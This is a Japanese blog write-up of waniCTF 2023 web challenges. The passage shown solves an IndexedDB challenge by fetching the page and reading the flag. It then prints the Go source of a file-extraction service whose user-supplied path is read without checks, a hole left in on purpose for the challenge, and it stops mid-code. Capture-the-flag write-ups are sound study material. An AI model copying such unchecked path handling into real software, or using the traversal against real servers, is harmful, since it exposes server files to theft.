@@ -1,0 +1,936 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[waniCTF 2023] writeup(web) - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="waniCTF 2023が2023/5/4(Thu) 15:00 ~ 2023/5/6(Sat) 15:00(JST)で開催されました。
+[web] IndexedDB このページのどこかにフラグが隠されているようです。ブラウザの開発者ツールを使って探してみましょう。
+It appears that the flag has been hidden somewhere on this page. Let&rsquo;s use the browser&rsquo;s developer tools to find it.
+https://indexeddb-web.wanictf.org
+/をcurlでGETするとflagをindexedDBに格納するjavascriptが含まれるページが返されます。
+$ curl https://indexeddb-web.wanictf.org/ <!DOCTYPE html> <html> <head> <meta charset=&#34;utf-8&#34; /> </head> <body> </body> <script> var connection; window.onload = function () { var openRequest = indexedDB.open(&#34;testDB&#34;); openRequest.onupgradeneeded = function () { connection = openRequest.result; var objectStore = connection.createObjectStore(&#34;testObjectStore&#34;, { keyPath: &#34;name&#34;, }); objectStore."><meta property="og:image" content><meta property="og:title" content="[waniCTF 2023] writeup(web)"><meta property="og:description" content="waniCTF 2023が2023/5/4(Thu) 15:00 ~ 2023/5/6(Sat) 15:00(JST)で開催されました。
+[web] IndexedDB このページのどこかにフラグが隠されているようです。ブラウザの開発者ツールを使って探してみましょう。
+It appears that the flag has been hidden somewhere on this page. Let&rsquo;s use the browser&rsquo;s developer tools to find it.
+https://indexeddb-web.wanictf.org
+/をcurlでGETするとflagをindexedDBに格納するjavascriptが含まれるページが返されます。
+$ curl https://indexeddb-web.wanictf.org/ <!DOCTYPE html> <html> <head> <meta charset=&#34;utf-8&#34; /> </head> <body> </body> <script> var connection; window.onload = function () { var openRequest = indexedDB.open(&#34;testDB&#34;); openRequest.onupgradeneeded = function () { connection = openRequest.result; var objectStore = connection.createObjectStore(&#34;testObjectStore&#34;, { keyPath: &#34;name&#34;, }); objectStore."><meta property="og:type" content="article"><meta property="og:url" content="/posts/35/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-06T15:00:37+09:00"><meta property="article:modified_time" content="2023-05-06T15:00:37+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[waniCTF 2023] writeup(web)"><meta name=twitter:description content="waniCTF 2023が2023/5/4(Thu) 15:00 ~ 2023/5/6(Sat) 15:00(JST)で開催されました。
+[web] IndexedDB このページのどこかにフラグが隠されているようです。ブラウザの開発者ツールを使って探してみましょう。
+It appears that the flag has been hidden somewhere on this page. Let&rsquo;s use the browser&rsquo;s developer tools to find it.
+https://indexeddb-web.wanictf.org
+/をcurlでGETするとflagをindexedDBに格納するjavascriptが含まれるページが返されます。
+$ curl https://indexeddb-web.wanictf.org/ <!DOCTYPE html> <html> <head> <meta charset=&#34;utf-8&#34; /> </head> <body> </body> <script> var connection; window.onload = function () { var openRequest = indexedDB.open(&#34;testDB&#34;); openRequest.onupgradeneeded = function () { connection = openRequest.result; var objectStore = connection.createObjectStore(&#34;testObjectStore&#34;, { keyPath: &#34;name&#34;, }); objectStore."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[waniCTF 2023] writeup(web)</h1><div class=meta>Posted on May 6, 2023</div></div><nav id=TableOfContents><ol><li><a href=#web-indexeddb>[web] IndexedDB</a></li><li><a href=#web-extract-service-1>[web] Extract Service 1</a></li><li><a href=#web-64bps>[web] 64bps</a></li><li><a href=#web-extract-service-2>[web] Extract Service 2</a></li><li><a href=#web-screenshot>[web] screenshot</a></li><li><a href=#web-certified1>[web] certified1</a></li><li><a href=#web-lambda>[web] Lambda</a></li><li><a href=#web-certified2>[web] certified2</a></li></ol></nav><section class=body><p>waniCTF 2023が2023/5/4(Thu) 15:00 ~ 2023/5/6(Sat) 15:00(JST)で開催されました。</p><h1 id=web-indexeddb>[web] IndexedDB</h1><blockquote><p>このページのどこかにフラグが隠されているようです。ブラウザの開発者ツールを使って探してみましょう。</p><p>It appears that the flag has been hidden somewhere on this page. Let&rsquo;s use the browser&rsquo;s developer tools to find it.</p><p><a href=https://indexeddb-web.wanictf.org>https://indexeddb-web.wanictf.org</a></p></blockquote><p><code>/</code>をcurlでGETするとflagをindexedDBに格納するjavascriptが含まれるページが返されます。</p><pre tabindex=0><code>$ curl https://indexeddb-web.wanictf.org/
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset=&#34;utf-8&#34; /&gt;
+  &lt;/head&gt;
+
+  &lt;body&gt;
+  &lt;/body&gt;
+  &lt;script&gt;
+    var connection;
+
+    window.onload = function () {
+      var openRequest = indexedDB.open(&#34;testDB&#34;);
+
+      openRequest.onupgradeneeded = function () {
+        connection = openRequest.result;
+        var objectStore = connection.createObjectStore(&#34;testObjectStore&#34;, {
+          keyPath: &#34;name&#34;,
+        });
+        objectStore.put({ name: &#34;FLAG{y0u_c4n_u3e_db_1n_br0wser}&#34; });
+      };
+
+      openRequest.onsuccess = function () {
+        connection = openRequest.result;
+      };
+      window.location = &#34;1ndex.html&#34;;
+    };
+  &lt;/script&gt;
+&lt;/html&gt;
+</code></pre><pre tabindex=0><code>FLAG{y0u_c4n_u3e_db_1n_br0wser}
+</code></pre><h1 id=web-extract-service-1>[web] Extract Service 1</h1><blockquote><p>ドキュメントファイルの要約サービスをリリースしました！配布ファイルのsampleフォルダにお試し用のドキュメントファイルがあるのでぜひ使ってください。</p><p>サーバーの/flagファイルには秘密の情報が書いてあるけど大丈夫だよね&mldr;? どんなHTTPリクエストが送信されるのか見てみよう！</p><p>We have released a summary service for document files! Please feel free to use the sample document file in the &ldquo;sample&rdquo; folder of the distribution file for trial purposes.</p><p>The secret information is written in the /flag file on the server, but it should be safe, right&mldr;? Let&rsquo;s see what kind of HTTP request is sent!</p><p><a href=https://extract1-web.wanictf.org>https://extract1-web.wanictf.org</a></p></blockquote><p><code>.docx</code>ファイルなどをアップロードすると、内容を要約してくれるアプリケーションが提供されます。</p><p><img src=/images/posts/35/extract_service1.png alt=extract_service1></p><p>以下、<code>main.go</code>です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;net/http&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;os&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;os/exec&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;path/filepath&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;regexp&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;github.com/google/uuid&#34;</span>
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Default</span>()
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>LoadHTMLGlob</span>(<span style=color:#e6db74>&#34;templates/*&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>MaxMultipartMemory</span> = <span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>20</span> <span style=color:#75715e>// 1MiB, to prevent DoS
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>GET</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>POST</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#e6db74>&#34;/tmp&#34;</span>, <span style=color:#a6e22e>uuid</span>.<span style=color:#a6e22e>NewString</span>()) <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#a6e22e>zipPath</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.zip&#34;</span>                        <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>FormFile</span>(<span style=color:#e6db74>&#34;file&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>PostForm</span>(<span style=color:#e6db74>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : target is required&#34;</span>,
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>MkdirAll</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#ae81ff>0777</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>SaveUploadedFile</span>(<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>zipPath</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractFile</span>(<span style=color:#a6e22e>zipPath</span>, <span style=color:#a6e22e>baseDir</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>result</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>			<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#a6e22e>result</span>,
+</span></span><span style=display:flex><span>		})
+</span></span><span style=display:flex><span>	})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>Run</span>(<span style=color:#e6db74>&#34;:8080&#34;</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		panic(<span style=color:#a6e22e>err</span>)
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>ExtractFile</span>(<span style=color:#a6e22e>zipPath</span>, <span style=color:#a6e22e>baseDir</span> <span style=color:#66d9ef>string</span>) <span style=color:#66d9ef>error</span> {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>exec</span>.<span style=color:#a6e22e>Command</span>(<span style=color:#e6db74>&#34;unzip&#34;</span>, <span style=color:#a6e22e>zipPath</span>, <span style=color:#e6db74>&#34;-d&#34;</span>, <span style=color:#a6e22e>baseDir</span>).<span style=color:#a6e22e>Run</span>(); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span> <span style=color:#66d9ef>string</span>) (<span style=color:#66d9ef>string</span>, <span style=color:#66d9ef>error</span>) {
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>raw</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>ReadFile</span>(<span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>))
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#a6e22e>err</span>
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>removeXmlTag</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>&#34;&lt;.*?&gt;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>resultXmlTagRemoved</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>removeXmlTag</span>.<span style=color:#a6e22e>ReplaceAllString</span>(string(<span style=color:#a6e22e>raw</span>), <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>removeNewLine</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>regexp</span>.<span style=color:#a6e22e>MustCompile</span>(<span style=color:#e6db74>`\r?\n`</span>)
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>resultNewLineRemoved</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>removeNewLine</span>.<span style=color:#a6e22e>ReplaceAllString</span>(<span style=color:#a6e22e>resultXmlTagRemoved</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>resultNewLineRemoved</span>, <span style=color:#66d9ef>nil</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>ファイルがアップロードされた際、以下の処理が実行されます。<code>/tmp</code>にディレクトリが作成され、アップロードされたファイルが<code>/tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip</code>などのパスに保存されます。保存されたファイルはzipファイルとして展開され、<code>target</code>で指定されたパスを読み込むことで文字列を抽出します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.go data-lang=:.go><span style=display:flex><span><span style=color:#a6e22e>r</span>.<span style=color:#a6e22e>POST</span>(<span style=color:#e6db74>&#34;/&#34;</span>, <span style=color:#66d9ef>func</span>(<span style=color:#a6e22e>c</span> <span style=color:#f92672>*</span><span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>Context</span>) {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>filepath</span>.<span style=color:#a6e22e>Join</span>(<span style=color:#e6db74>&#34;/tmp&#34;</span>, <span style=color:#a6e22e>uuid</span>.<span style=color:#a6e22e>NewString</span>()) <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#a6e22e>zipPath</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>baseDir</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;.zip&#34;</span>                        <span style=color:#75715e>// ex. /tmp/02050a65-8ae8-4b50-87ea-87b3483aab1e.zip
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>FormFile</span>(<span style=color:#e6db74>&#34;file&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>PostForm</span>(<span style=color:#e6db74>&#34;target&#34;</span>)
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>extractTarget</span> <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;&#34;</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : target is required&#34;</span>,
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>MkdirAll</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#ae81ff>0777</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>SaveUploadedFile</span>(<span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>zipPath</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractFile</span>(<span style=color:#a6e22e>zipPath</span>, <span style=color:#a6e22e>baseDir</span>); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>c</span>.<span style=color:#a6e22e>HTML</span>(<span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>StatusOK</span>, <span style=color:#e6db74>&#34;index.html&#34;</span>, <span style=color:#a6e22e>gin</span>.<span style=color:#a6e22e>H</span>{
+</span></span><span style=display:flex><span>				<span style=color:#e6db74>&#34;result&#34;</span>: <span style=color:#e6db74>&#34;Error : &#34;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>Error</span>(),
+</span></span><span style=display:flex><span>			})
+</span></span><span style=display:flex><span>			<span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>		}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>result</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>ExtractContent</span>(<span style=color:#a6e22e>baseDir</span>, <span style=color:#a6e22e>extractTarget</span>)
